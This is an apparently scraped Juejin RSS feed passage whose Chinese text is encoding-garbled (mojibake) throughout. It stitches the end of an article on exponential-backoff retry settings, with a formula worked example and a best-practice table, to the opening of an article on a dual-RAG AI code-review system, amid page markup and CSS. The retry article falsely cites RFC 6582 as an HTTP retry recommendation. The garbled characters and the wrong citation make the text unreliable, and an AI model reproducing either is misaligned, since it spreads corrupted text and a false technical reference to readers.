<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c9dc3f6027427e91fbb4720af1f6f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=TR3ZBRaHU199Q%2BUa5YjDvjx2WIE%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï¼Œ</p>
<p>æ ¹æ®ç­‰æ¯”æ•°åˆ—æ±‚å’Œå…¬å¼å¯ä»¥å¾—åˆ°ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbb66ae44f8446d0ba5dcb6ae971c6b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=jMhrkwWNg5QHF%2BjyqmRLGqdkD6U%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ä»¤ M=2ï¼ˆå¸¸ç”¨ä¹˜æ•°ï¼‰ï¼ŒF=1 ç§’ï¼ˆæœ€å°å¯èƒ½å€¼ï¼‰ï¼š</p>
<p>n=3æ—¶ï¼ŒT=ï¼ˆ2^3-1ï¼‰/ï¼ˆ2-1ï¼‰=7ç§’</p>
<p>n=5æ—¶ï¼ŒT=(2^5-1)/(2-1)=31ç§’</p>
<p>n=10æ—¶ï¼ŒT=2^10-1=1023ç§’â‰ˆ17åˆ†é’Ÿ</p>
<p>n=13æ—¶ï¼ŒT=2^13-1â‰ˆ2.3å°æ—¶</p>
<p>n=15æ—¶ï¼ŒT=2^15-1â‰ˆ9.1å°æ—¶</p>
<p>å½“nè¶…è¿‡10åï¼Œæ¯æ¬¡å¢åŠ éƒ½ä¼šå¯¼è‡´æ€»è€—æ—¶æ€¥å‰§å¢é•¿ï¼Œå¾ˆå®¹æ˜“è¶…è¿‡ä¸šåŠ¡çš„å®¹å¿ä¸Šé™ï¼ˆå…·ä½“ä¸šåŠ¡å…·ä½“åˆ†æï¼‰ï¼Œä¹Ÿå¯èƒ½å› ä¸ºé‡è¯•è¿‡å¤šï¼Œå¯¼è‡´è¢«è°ƒç”¨çš„ç³»ç»Ÿå‹åŠ›å¢åŠ ï¼Œç”šè‡³é€ æˆç³»ç»Ÿå´©æºƒã€‚</p>
<p>æ•…ï¼š3 - 10 æ¬¡é‡è¯•å¯å°†æ€»è€—æ—¶æ§åˆ¶åœ¨â€œä¸šåŠ¡å¯æ¥å—èŒƒå›´â€ï¼ˆå‡ ç§’åˆ°åå‡ åˆ†é’Ÿï¼‰ï¼ŒåŒæ—¶é¿å…èµ„æºè¿‡è½½ã€‚</p>
<p>è¡Œä¸šå®è·µï¼šKafka æ¶ˆè´¹è€…é‡è¯•ï¼šé»˜è®¤ 10 æ¬¡ã€Redis å®¢æˆ·ç«¯é‡è¯•ï¼šé»˜è®¤ 5 æ¬¡ã€Hadoop ä»»åŠ¡é‡è¯•ï¼šé»˜è®¤ 3-5 æ¬¡ã€RFC å»ºè®®ï¼šRFC 6582ï¼ˆHTTP é‡è¯•ï¼‰å»ºè®®ï¼š3-5 æ¬¡é‡è¯•ã€‚</p>
<h5 data-id="heading-9">3ã€æœ€ä½³å®è·µé€ŸæŸ¥è¡¨</h5>









































<table><thead><tr><th>å‚æ•°</th><th>çŸ­æœŸä»»åŠ¡(åˆ†é’Ÿçº§)</th><th>ä¸­æœŸä»»åŠ¡(å°æ—¶çº§)</th><th>é•¿æœŸä»»åŠ¡(å¤©çº§)</th></tr></thead><tbody><tr><td>ä¹˜æ•°</td><td>2</td><td>2</td><td>1.75</td></tr><tr><td>é‡è¯•æ¬¡æ•°</td><td>3 - 5</td><td>5 - 8</td><td>8 - 12</td></tr><tr><td>åˆå§‹é—´éš”(ç§’)</td><td>1 - 5</td><td>30 - 60</td><td>300 - 600</td></tr><tr><td>æ€»è€—æ—¶èŒƒå›´</td><td>&lt;60ç§’</td><td>5 - 10åˆ†é’Ÿ</td><td>1 - 2å°æ—¶</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>ä¸´æ—¶ç½‘ç»œæ³¢åŠ¨ æœåŠ¡é‡å¯ã€å‘ç‰ˆ</td><td>æœåŠ¡çŸ­æš‚è¿‡è½½</td><td>èµ„æºå¯†é›†å‹æ“ä½œ</td></tr></tbody></table>
<h2 data-id="heading-10">ä¸‰ã€ç»éªŒæ²‰æ·€ï¼šå¼‚å¸¸é‡è¯•æœºåˆ¶çš„è®¾è®¡åŸåˆ™â€‹</h2>
<p>é€šè¿‡è¿™æ¬¡å®è·µå’Œå¯¹è¡Œä¸šæ–¹æ¡ˆçš„ç ”ç©¶ï¼Œæˆ‘ä»¬æ€»ç»“å‡ºå¼‚å¸¸é‡è¯•æœºåˆ¶è®¾è®¡çš„å››å¤§æ ¸å¿ƒåŸåˆ™ï¼šâ€‹</p>
<p>1.åŠ¨æ€é€‚åº”æ€§åŸåˆ™ï¼šé‡è¯•ç­–ç•¥åº”æ”¯æŒå‚æ•°åŒ–é…ç½®ï¼Œæ ¹æ®ä¸šåŠ¡åœºæ™¯å’Œç³»ç»Ÿè´Ÿè½½åŠ¨æ€è°ƒæ•´é‡è¯•é—´éš”å’Œæ¬¡æ•°ï¼Œé¿å… â€œä¸€åˆ€åˆ‡â€ çš„é‡è¯•ç­–ç•¥å¯¹ç³»ç»Ÿé€ æˆå†²å‡»ã€‚â€‹</p>
<p>2.å¹‚ç­‰æ€§ä¿éšœåŸåˆ™ï¼šç¡®ä¿ä»»åŠ¡åœ¨å¤šæ¬¡é‡è¯•è¿‡ç¨‹ä¸­ä¸ä¼šäº§ç”Ÿé‡å¤æ•°æ®æˆ–å‰¯ä½œç”¨ï¼Œé€šè¿‡å”¯ä¸€æ ‡è¯†ã€çŠ¶æ€æœºç­‰æŠ€æœ¯æ‰‹æ®µï¼Œå®ç°ä»»åŠ¡çš„å¹‚ç­‰æ‰§è¡Œã€‚â€‹</p>
<p>3.æ•…éšœéš”ç¦»åŸåˆ™ï¼šå°†é‡è¯•é€»è¾‘ä¸ä¸šåŠ¡é€»è¾‘åˆ†ç¦»ï¼Œé€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—ã€å¼‚æ­¥è°ƒåº¦ç­‰æ–¹å¼ï¼Œé™ä½é‡è¯•æ“ä½œå¯¹ä¸»çº¿ç¨‹çš„å½±å“ï¼Œé¿å…å› é‡è¯•å¤±è´¥å¯¼è‡´ç³»ç»Ÿæ•´ä½“å´©æºƒã€‚â€‹</p>
<p>4.å¯è§‚æµ‹æ€§åŸåˆ™ï¼šå»ºç«‹å®Œå–„çš„ç›‘æ§å’Œå‘Šè­¦ä½“ç³»ï¼Œå®æ—¶è¿½è¸ªä»»åŠ¡é‡è¯•çŠ¶æ€ï¼Œåœ¨è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°æ—¶åŠæ—¶å‘å‡ºå‘Šè­¦ï¼Œä¾¿äºè¿ç»´äººå‘˜å¿«é€Ÿå®šä½å’Œè§£å†³é—®é¢˜ã€‚â€‹</p>
<h2 data-id="heading-11">å››ã€ç»“è¯­ï¼šä»¥æŠ€æœ¯æ²‰æ·€ç­‘ç‰¢å¤§ä¿ƒé˜²çº¿â€‹</h2>
<p>è¿™æ¬¡çº¿ä¸Šå¼‚å¸¸äº‹ä»¶ï¼ŒçŠ¹å¦‚ä¸€é¢é•œå­ï¼Œè®©æˆ‘ä»¬æ¸…æ™°åœ°çœ‹åˆ°äº†ç³»ç»Ÿä¸­çš„æ½œåœ¨é£é™©ï¼Œä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€æ¬¡å®è´µçš„æŠ€æœ¯æå‡æœºä¼šã€‚é€šè¿‡å¯¹å¼‚å¸¸é‡è¯•æœºåˆ¶çš„æ·±å…¥ç ”ç©¶å’Œå®è·µï¼Œæˆ‘ä»¬ä¸ä»…è§£å†³äº†å½“å‰é—®é¢˜ï¼Œæ›´å°†è¿™äº›ç»éªŒè½¬åŒ–ä¸ºå›¢é˜Ÿçš„æŠ€æœ¯èµ„äº§ã€‚åœ¨æœªæ¥çš„ 618 å¤§ä¿ƒåŠå…¶ä»–å…³é”®ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å°†ä»¥æ›´å®Œå–„çš„æŠ€æœ¯æ–¹æ¡ˆã€æ›´ä¸¥è°¨çš„è®¾è®¡åŸåˆ™ï¼Œå®ˆæŠ¤ç³»ç»Ÿçš„ç¨³å®šè¿è¡Œï¼Œä¸ºä¸šåŠ¡å‘å±•æä¾›åšå®çš„æŠ€æœ¯ä¿éšœã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºçŸ¥è¯†å·¥ç¨‹&JoyAgentåŒRAGçš„æ™ºèƒ½ä»£ç è¯„å®¡ç³»ç»Ÿçš„æ¢ç´¢ä¸å®è·µ]]></title>    <link>https://juejin.cn/post/7597379486428364826</link>    <guid>https://juejin.cn/post/7597379486428364826</guid>    <pubDate>2026-01-21T09:37:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597379486428364826" data-draft-id="7597640029573627955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºçŸ¥è¯†å·¥ç¨‹&amp;JoyAgentåŒRAGçš„æ™ºèƒ½ä»£ç è¯„å®¡ç³»ç»Ÿçš„æ¢ç´¢ä¸å®è·µ"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-21T09:37:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¬ä¸œäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºçŸ¥è¯†å·¥ç¨‹&amp;JoyAgentåŒRAGçš„æ™ºèƒ½ä»£ç è¯„å®¡ç³»ç»Ÿçš„æ¢ç´¢ä¸å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¬ä¸œäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:37:02.000Z" title="Wed Jan 21 2026 09:37:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šé½æµ·æ™º</p>
<h2 data-id="heading-0">å¤§ä¿ƒå¤‡æˆ˜ä¸­çš„ä»£ç è¯„å®¡å›°å¢ƒä¸ç ´å±€</h2>
<p>åŒåä¸€å¤§ä¿ƒæ˜¯ç³»ç»Ÿç¨³å®šæ€§çš„ç»ˆæâ€œå¤§è€ƒâ€ã€‚ä¸ºè§„é¿ä¸Šçº¿é£é™©ï¼ŒæŠ€æœ¯ä¾§ä¼šå¯åŠ¨ç³»ç»Ÿå°æ¿ç®¡æ§ï¼Œä¸»åŠ¨å°†éç´§æ€¥éœ€æ±‚çš„å‘å¸ƒçª—å£å‰ç½®ã€‚è¿™ä¸€ä¸¾æªåœ¨ä¿éšœç³»ç»Ÿç¨³å®šæ€§çš„åŒæ—¶ï¼Œä¹Ÿå¿…ç„¶å¯¼è‡´ç ”å‘éœ€æ±‚çš„å‰ç½®ä¸é›†ä¸­ï¼Œä½¿å¾—å°æ¿å‰çš„ä»£ç è¯„å®¡ä»»åŠ¡é‡æ˜¾è‘—å¢åŠ ã€‚æˆ‘ä»¬é¢ä¸´ç€ä¸€ä¸ªä¸¥å³»çš„â€œé‡ä¸è´¨â€çš„æŒ‘æˆ˜ï¼š</p>
<blockquote>
<p>å¦‚ä½•åœ¨æ—¶é—´ç´§ã€ä»»åŠ¡é‡çš„åŒé‡å‹åŠ›ä¸‹ï¼Œç¡®ä¿ä»£ç è¯„å®¡çš„æ•ˆç‡ä¸è´¨é‡ï¼Œä»è€Œå‰ç½®å‘ç°æ½œåœ¨é£é™©ï¼Œæœ‰æ•ˆæ‹¦æˆªçº¿ä¸ŠBUGï¼Ÿ</p>
</blockquote>
<p>ä¼ ç»Ÿçš„ä»£ç è¯„å®¡æ¨¡å¼åœ¨æ­¤åœºæ™¯ä¸‹æ•ˆç‡ä½ã€è´¨é‡å·®ï¼ˆé£é™©é—æ¼çš„å¯èƒ½æ€§é«˜ï¼‰ï¼Œè€Œç°æœ‰çš„AIè¾…åŠ©å·¥å…·åˆå› è¯¯æŠ¥ç‡é«˜è€Œé™·å…¥å°´å°¬ï¼šäº§ç”Ÿçš„å¤šæ•°è¯„å®¡æ„è§å¹¶æ— å®è´¨å¸®åŠ©ï¼Œå·¥ç¨‹å¸ˆä»éœ€èŠ±è´¹å¤§é‡æ—¶é—´è¿›è¡Œåˆ¤æ–­ä¸ç­›é€‰ã€‚</p>
<p>æ­£æ˜¯åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼Œã€ä¾›åº”é“¾æŠ€æœ¯éƒ¨-å•†å®¶å¯¼å…¥ç ”å‘ç»„ã€‘åœ¨AIä»£ç è¯„å®¡æ–¹é¢è¿›è¡Œäº†ä¸€äº›æ¢ç´¢ï¼Œå°è¯•å°†çŸ¥è¯†å·¥ç¨‹ä»£ç çŸ¥è¯†æ£€ç´¢èƒ½åŠ›ä¸AutoBotsï¼ˆå·²æ›´åä¸ºï¼šJoyAgentï¼‰çŸ¥è¯†åº“æ£€ç´¢èƒ½åŠ›ç›¸ç»“åˆï¼Œæ„å»ºäº†ä¸€å¥—ä»£ç è¯„å®¡ç³»ç»Ÿã€‚è¿™å¥—åŒRAGæ¶æ„ä¸ºæˆ‘ä»¬çš„ä»£ç è¯„å®¡å·¥ä½œæä¾›äº†ä¸€äº›æ–°æ€è·¯ï¼Œåœ¨æ­¤åˆ†äº«å‡ºæ¥ï¼Œå¸Œæœ›ä¸å„ä½åŒè¡Œäº¤æµæ¢è®¨ï¼Œå…±åŒè¿›æ­¥ã€‚</p>
<h2 data-id="heading-1">ç°æœ‰æŠ€æœ¯æ–¹æ¡ˆçš„å±€é™æ€§</h2>
<h3 data-id="heading-2">æŠ€æœ¯1ï¼šåŸºäºæµæ°´çº¿çš„AIä»£ç è¯„å®¡æ–¹æ¡ˆ</h3>
<p><strong>æ ¸å¿ƒæŠ€æœ¯è·¯å¾„</strong>ï¼š åœ¨é€šè¿‡å…¬å…±æµç¨‹ï¼ˆWebhookè§¦å‘ã€è§£æMRã€è·å–Diffï¼‰å¾—åˆ°ä»£ç å˜æ›´å†…å®¹åï¼Œè¯¥æ–¹æ¡ˆçš„æ ¸å¿ƒå¤„ç†æµç¨‹å¦‚ä¸‹ï¼š</p>
<p>1.<strong>æ–‡ä»¶ç±»å‹è¿‡æ»¤</strong>ï¼šä»…ä¿ç•™.javaã€.yamlå’Œ.mdæ–‡ä»¶è¿›è¡Œåç»­åˆ†æï¼Œå¹¶æ˜ç¡®ä¼˜å…ˆçº§çš„å¤„ç†é¡ºåºã€‚</p>
<p>2.<strong>ä¸Šä¸‹æ–‡æˆªæ–­</strong>ï¼šä¸ºé¿å…è§¦åŠå¤§æ¨¡å‹ä¸Šä¸‹æ–‡çª—å£ä¸Šé™ï¼Œé‡‡ç”¨äº†ä¸€ç§åŸºäºå›ºå®šè¡Œæ•°çš„ä¸Šä¸‹æ–‡æˆªæ–­ç­–ç•¥ã€‚è¯¥ç­–ç•¥ä»…æˆªå–ä»£ç å˜æ›´å¤„é™„è¿‘é¢„è®¾è¡Œæ•°ï¼ˆå¦‚10è¡Œï¼‰çš„æ–‡æœ¬å†…å®¹ã€‚</p>
<p>3.<strong>Prompté©±åŠ¨è¯„å®¡</strong>ï¼šå°†ç»è¿‡è¿‡æ»¤å’Œæˆªæ–­åçš„ä»£ç ç‰‡æ®µï¼Œä¸é¢„è®¾çš„è¯„å®¡è§„åˆ™Promptç»„åˆï¼Œå‘é€ç»™é€šç”¨å¤§è¯­è¨€æ¨¡å‹ã€‚</p>
<p>4.<strong>è¾“å‡ºè¯„å®¡æ„è§</strong>ï¼šè§£æå¤§æ¨¡å‹çš„è¿”å›ç»“æœï¼Œé€šè¿‡codingå¹³å°APIå°†è¯„å®¡ç»“æœæ·»åŠ åˆ°MRä¸­ã€‚</p>
<p><strong>æ ¸å¿ƒé—®é¢˜è¯†åˆ«</strong>ï¼š</p>
<p>1.<strong>å…¨å±€ä¸Šä¸‹æ–‡ç¼ºå¤±</strong>ï¼šå…¶é‡‡ç”¨çš„â€œå›ºå®šè¡Œæ•°æˆªæ–­â€ç­–ç•¥æ˜¯å¯¼è‡´é—®é¢˜çš„æ ¹æœ¬åŸå› ä¹‹ä¸€ã€‚è¿™ä½¿å¾—è¯„å®¡å®Œå…¨ä¸§å¤±äº†é¡¹ç›®æ¶æ„ã€æ¨¡å—ä¾èµ–å’Œå®Œæ•´ä¸šåŠ¡é€»è¾‘çš„è§†é‡ï¼Œå¦‚åŒâ€œç®¡ä¸­çª¥è±¹â€ï¼Œè¯„å®¡æ·±åº¦å’Œå‡†ç¡®æ€§å—åˆ°ä¸¥é‡åˆ¶çº¦ã€‚</p>
<p>2.<strong>æç¤ºè¯å¤©èŠ±æ¿</strong>ï¼šæ‰€æœ‰è¯„å®¡è§„åˆ™ä¸çŸ¥è¯†ç¡¬ç¼–ç äºPromptä¸­ï¼Œè§„åˆ™è†¨èƒ€åææ˜“è§¦åŠæ¨¡å‹ä¸Šä¸‹æ–‡é•¿åº¦ä¸Šé™ï¼Œå¯ç»´æŠ¤æ€§ä¸æ‰©å±•æ€§å·®ã€‚</p>
<p>3.<strong>çŸ¥è¯†æ— æ³•æ²‰æ·€</strong>ï¼šæ•ˆæœæå‡å®Œå…¨ä¾èµ–äºâ€œæ›´æ¢æ›´å¼ºçš„åŸºç¡€æ¨¡å‹â€ä¸â€œè°ƒæ•´Promptâ€ï¼Œè‡ªèº«ç¼ºä¹å¯æŒç»­ç§¯ç´¯ã€æ²‰æ·€å’Œå¤ç”¨é¢†åŸŸçŸ¥è¯†çš„æœºåˆ¶ã€‚</p>
<h3 data-id="heading-3">æŠ€æœ¯2ï¼šåŸºäºJoyAgentçŸ¥è¯†åº“çš„RAGä»£ç è¯„å®¡</h3>
<p><strong>æ ¸å¿ƒæŠ€æœ¯è·¯å¾„</strong>ï¼š åœ¨é€šè¿‡å…¬å…±æµç¨‹è·å–ä»£ç å·®å¼‚åï¼Œè¯¥æ–¹æ¡ˆçš„æ ¸å¿ƒæµç¨‹å¦‚ä¸‹ï¼š</p>
<p>1.çŸ¥è¯†å½’çº³ï¼šå°†æ ¼å¼åŒ–åçš„Diffå†…å®¹å‘é€ç»™JoyAgentï¼Œç”±LLMæ™ºèƒ½ä½“å¯¹å…¶è¿›è¡Œåˆæ­¥çš„â€œçŸ¥è¯†å½’çº³â€ï¼Œä»¥ç†è§£æ­¤æ¬¡å˜æ›´çš„æ ¸å¿ƒæ„å›¾ã€‚</p>
<p>2.è§„åˆ™æ£€ç´¢ï¼šåŸºäºå½’çº³å‡ºçš„çŸ¥è¯†ï¼Œé€šè¿‡RAGæœºåˆ¶ä»è‡ªå®šä¹‰çŸ¥è¯†åº“ä¸­å¬å›ç›¸å…³çš„ä»£ç è¯„å®¡è§„åˆ™ã€‚æ­¤çŸ¥è¯†åº“æ”¯æŒåœ¨çº¿æ–‡æ¡£ï¼ˆJoyspaceï¼‰ã€ç¦»çº¿æ–‡æ¡£ï¼ˆPDF/Wordï¼‰ç­‰å¤šç§æ ¼å¼ã€‚è¯¥æ–¹æ¡ˆçš„æ ¸å¿ƒçµæ´»æ€§åœ¨äºå…¶â€œè‡ªå®šä¹‰çŸ¥è¯†åº“ç»‘å®šâ€æœºåˆ¶ã€‚æ¥å…¥è€…å¯ä»¥åœ¨JoyAgentå¹³å°ä¸Šè‡ªå®šä¹‰æ™ºèƒ½ä½“ï¼Œé€šè¿‡å·¥ä½œæµç»‘å®šè‡ªå®šä¹‰çŸ¥è¯†åº“ã€‚è¿™ä½¿å¾—åœ¨å¬å›è¯„å®¡è§„åˆ™æ—¶ï¼Œç³»ç»Ÿèƒ½åŠ¨æ€åœ°æŸ¥æ‰¾å¹¶åº”ç”¨æ¥å…¥è€…è‡ªå®šä¹‰çš„è¯„å®¡è§„åˆ™ï¼Œä»è€Œå®ç°äº†æ— éœ€ä¿®æ”¹Promptå³å¯å®šåˆ¶è¯„å®¡è§„åˆ™çš„èƒ½åŠ›ã€‚</p>
<p>3.è¡Œçº§è¯„å®¡ï¼šJoyAgentå°†ä»£ç Diffä¸å¬å›çš„å…·ä½“è§„åˆ™ç›¸ç»“åˆï¼Œå†æ¬¡è°ƒç”¨LLMè¿›è¡Œç²¾ç¡®è¯„å®¡ã€‚åˆ©ç”¨Git Diffä¿¡æ¯ä¸­åŒ…å«çš„ä»£ç è¡Œä¿¡æ¯ï¼Œèƒ½å¤Ÿå°†è¯„å®¡æ„è§ç²¾å‡†å…³è”åˆ°å…·ä½“çš„ä»£ç è¡Œã€‚</p>
<p>4.è¾“å‡ºç»“æœï¼šç›´æ¥ä½¿ç”¨JoyAgentçš„è¾“å‡ºç»“æœï¼Œé€šè¿‡codingå¹³å°APIå°†è¯„å®¡ç»“æœæ·»åŠ åˆ°MRä¸­ã€‚</p>
<p><strong>æ ¸å¿ƒé—®é¢˜è¯†åˆ«</strong>ï¼š</p>
<p>1.<strong>çŸ¥è¯†å½’çº³å¤±çœŸ</strong>ï¼šæ ¸å¿ƒé—®é¢˜æºäºå…¶â€œçŸ¥è¯†å½’çº³â€æ­¥éª¤ã€‚è¯¥æ­¥éª¤ä¾èµ–åº•å±‚å¤§æ¨¡å‹å¯¹Code Diffè¿›è¡Œæ€»ç»“ï¼Œæ­¤è¿‡ç¨‹ä¸ç¨³å®šï¼Œç»å¸¸é—æ¼æˆ–æ›²è§£åŸå§‹ä»£ç å˜æ›´çš„å…³é”®ä¸Šä¸‹æ–‡ï¼Œå¯¼è‡´åç»­æµç¨‹å»ºç«‹åœ¨ä¸€ä¸ªä¸å®Œæ•´æˆ–å¤±çœŸçš„ä¿¡æ¯åŸºç¡€ä¹‹ä¸Šã€‚</p>
<p>2.<strong>æ£€ç´¢ä¸ç”Ÿæˆè”åŠ¨å¤±æ•ˆ</strong>ï¼šåŸºäºå¤±çœŸçš„çŸ¥è¯†å½’çº³ç»“æœè¿›è¡ŒRAGæ£€ç´¢ï¼Œå¯¼è‡´å¬å›çš„è§„åˆ™ä¸çœŸå®ä»£ç åœºæ™¯åŒ¹é…åº¦ä½ã€‚æ­¤å¤–ï¼Œæ£€ç´¢ç»“æœæœªç»æœ‰æ•ˆçš„é‡æ’åºï¼Œç›´æ¥ä¸ä¸å®Œæ•´çš„ä»£ç ä¸Šä¸‹æ–‡ä¸€å¹¶é€å…¥å¤§æ¨¡å‹ï¼Œè¿™ä½¿å¾—æ¨¡å‹ç¼ºä¹è¿›è¡Œå‡†ç¡®åˆ¤æ–­çš„å¯é ä¾æ®ï¼Œæœ€ç»ˆå¿…ç„¶ç”Ÿæˆå¤§é‡ä¸å¯é ç”šè‡³é”™è¯¯çš„è¯„å®¡æ„è§ã€‚</p>
<h2 data-id="heading-4">ä»çº¿ä¸Šé—®é¢˜åˆ°æŠ€æœ¯çªç ´</h2>
